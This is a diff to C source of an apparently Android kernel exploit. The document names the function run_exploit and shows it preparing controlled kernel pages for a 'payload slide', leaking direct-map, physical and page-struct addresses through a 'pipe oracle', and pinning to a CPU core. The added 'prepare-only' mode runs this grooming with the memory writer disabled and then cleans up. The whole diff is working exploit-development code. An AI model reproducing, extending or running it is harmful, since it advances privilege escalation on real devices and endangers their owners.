@@ -33,6 +33,78 @@ static void durable_log_checkpoint(const char *stage) {
   }
   SYSCHK(fsync(STDOUT_FILENO));
 }
+
+static int p0_prepare_only_enabled(void) {
+  const char *value = getenv("RMG_P0_PREPARE_ONLY");
+  p0_prepare_only_active =
+      value && *value && strcmp(value, "0") != 0;
+  return p0_prepare_only_active;
+}
+
+static void cleanup_p0_prepare_only(void) {
+  pr_info("p0 prepare-only cleanup stage=reclaim-sockets begin\n");
+  close_reclaim_sockets();
+  pr_info("p0 prepare-only cleanup stage=reclaim-sockets done\n");
+
+  pr_info("p0 prepare-only cleanup stage=page-state begin\n");
+  cleanup_page_prepare_state();
+  pr_info("p0 prepare-only cleanup stage=page-state done\n");
+
+  pr_info("p0 prepare-only cleanup stage=pipe-oracle begin\n");
+  reset_pipe_attempt();
+  pr_info("p0 prepare-only cleanup stage=pipe-oracle done\n");
+
+  page_base = 0;
+  p0_gate_page_struct = 0;
+  p0_probe_page_struct = 0;
+  app_fops_reused_page_ready = 0;
+  slide_p0_session_fresh = 0;
+}
+
+static int run_p0_prepare_only(void) {
+  int prepared = 0;
+  const char *oracle_value = getenv("RMG_P0_PREPARE_ORACLE");
+  int prepare_oracle =
+      oracle_value && *oracle_value && strcmp(oracle_value, "0") != 0;
+
+  pr_success("p0 prepare-only diagnostic begin pid=%d writer=disabled "
+             "pipe_oracle=%d\n",
+             getpid(), prepare_oracle);
+  if (prepare_oracle && !prepare_p0_pipe_oracle()) {
+    pr_error("p0 prepare-only pipe oracle preparation failed\n");
+    goto out;
+  }
+
+  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
+  if (!is_direct_ptr(page_base) || page_base < P0_PAGE_OFFSET) {
+    pr_error("p0 prepare-only controlled page preparation failed "
+             "base=%016zx\n",
+             page_base);
+    goto out;
+  }
+
+  unsigned long long phys =
+      (unsigned long long)(page_base - P0_PAGE_OFFSET) + P0_PHYS_OFFSET;
+  unsigned long long pfn = phys >> PAGE_SHIFT;
+  uintptr_t page_struct = direct_to_page(page_base);
+  pr_success("p0 prepare-only ready pid=%d direct=%016zx phys=%016llx "
+             "pfn=0x%llx pages=%lu page_struct=%016zx pipe_direct=%016zx "
+             "writer=disabled\n",
+             getpid(), page_base, phys, pfn,
+             (unsigned long)(ORDER3_SIZE / PAGE_SIZE), page_struct,
+             pipebuf_page_base);
+  durable_log_checkpoint("p0-prepare-only-ready");
+  prepared = 1;
+
+out:
+  cleanup_p0_prepare_only();
+  durable_log_checkpoint("p0-prepare-only-clean");
+  if (prepared) {
+    pr_success("p0 prepare-only diagnostic complete writer=disabled "
+               "cleanup=done\n");
+  }
+  return prepared;
+}
 #endif
 
 #if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
@@ -434,6 +506,11 @@ int run_exploit(int argc, char **argv) {
   init_ashmem_path();
 
   pin_to_core(CORE);
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  if (p0_prepare_only_enabled()) {
+    return run_p0_prepare_only() ? 0 : 1;
+  }
+#endif
 #if defined(SLIDE_STACK_WRITER) && \
     defined(SLIDE_STACK_WRITER_SIGRETURN) && \
     SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
